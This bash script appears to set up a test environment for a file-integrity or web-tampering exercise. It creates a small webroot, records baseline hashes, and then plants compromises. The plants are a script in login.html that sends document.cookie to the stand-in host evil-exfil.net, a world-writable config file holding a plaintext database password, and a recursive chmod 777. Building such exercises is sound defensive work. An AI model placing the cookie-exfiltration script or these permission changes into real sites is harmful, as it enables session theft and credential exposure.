#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip
pip3 install pytest

mkdir -p /home/user/webroot

cat << 'EOF' > /home/user/webroot/index.html
<html><body><h1>Welcome to the secure portal</h1></body></html>
EOF

cat << 'EOF' > /home/user/webroot/login.html
<html><body><form>User: <input type="text"><br>Pass: <input type="password"></form></body></html>
EOF

cat << 'EOF' > /home/user/webroot/db_config.ini
[database]
user=admin
password=supersecret
host=localhost
EOF

cat << 'EOF' > /home/user/webroot/app.js
console.log("App loaded securely.");
EOF

chmod 644 /home/user/webroot/*

cd /home/user/webroot
sha256sum * > /home/user/baseline.sha256
sed -i 's/  /  \/home\/user\/webroot\//' /home/user/baseline.sha256
cd /

cat << 'EOF' >> /home/user/webroot/login.html
<script>
  fetch("https://evil-exfil.net/steal?c=" + document.cookie);
</script>
EOF

chmod 777 /home/user/webroot/db_config.ini

cat << 'EOF' > /home/user/csp.txt
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
EOF

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user
